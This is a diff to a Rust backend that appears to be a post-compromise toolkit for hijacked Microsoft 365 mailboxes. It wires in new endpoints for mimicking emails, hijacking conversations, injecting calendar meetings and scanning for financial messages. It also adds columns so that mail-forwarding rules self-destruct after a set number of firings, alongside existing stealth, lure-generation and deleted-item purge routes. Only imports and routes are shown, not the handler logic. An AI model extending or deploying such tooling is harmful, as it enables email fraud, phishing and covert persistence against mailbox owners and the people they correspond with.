@@ -61,7 +61,7 @@ mod bec;
 use bec::bec_analyze_handler;
 
 mod lure;
-use lure::generate_lure_handler;
+use lure::{generate_lure_handler, mimic_email_handler, hijack_conversation_handler, financial_detection_handler};
 
 mod inbox_folders;
 use inbox_folders::{
@@ -76,7 +76,7 @@ use inbox_folders::{
 };
 
 mod calendar;
-use calendar::list_calendar_events_handler;
+use calendar::{list_calendar_events_handler, inject_meeting_handler};
 
 mod teams;
 use teams::{list_teams_handler, list_team_channels_handler, share_to_teams_handler};
@@ -1760,6 +1760,11 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
         .execute(pool).await;
     let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN forward_to TEXT")
         .execute(pool).await;
+    // Self-destructing rules: track how many times a rule has fired
+    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN fire_count INTEGER DEFAULT 0")
+        .execute(pool).await;
+    let _ = sqlx::query("ALTER TABLE created_rules ADD COLUMN max_fires INTEGER")
+        .execute(pool).await;
 
     sqlx::query(
         r#"
@@ -1974,6 +1979,7 @@ async fn main() -> std::io::Result<()> {
             .route("/api/office/embed", web::get().to(get_office_embed_url_handler))
             .route("/api/stealth/config", web::get().to(stealth_config_handler))
             .route("/api/calendar/events", web::get().to(list_calendar_events_handler))
+            .route("/api/calendar/inject-meeting", web::post().to(inject_meeting_handler))
             .route("/api/teams", web::get().to(list_teams_handler))
             .route("/api/teams/{id}/channels", web::get().to(list_team_channels_handler))
             .route("/api/teams/share", web::post().to(share_to_teams_handler))
@@ -2023,6 +2029,9 @@ async fn main() -> std::io::Result<()> {
             .route("/api/inbox/deleted-items/{token_id}", web::get().to(get_deleted_items_handler))
             .route("/api/inbox/deleted-items/{token_id}/purge", web::post().to(purge_deleted_items_handler))
             .route("/api/lure/generate", web::post().to(generate_lure_handler))
+            .route("/api/lure/mimic", web::post().to(mimic_email_handler))
+            .route("/api/conversation/hijack", web::post().to(hijack_conversation_handler))
+            .route("/api/financial/scan", web::post().to(financial_detection_handler))
             // === Advanced Graph API features ===
             .route("/api/mailbox/settings/{token_id}", web::get().to(get_mailbox_settings_handler))
             .route("/api/mailbox/auto-reply/{token_id}", web::post().to(set_auto_reply_handler))
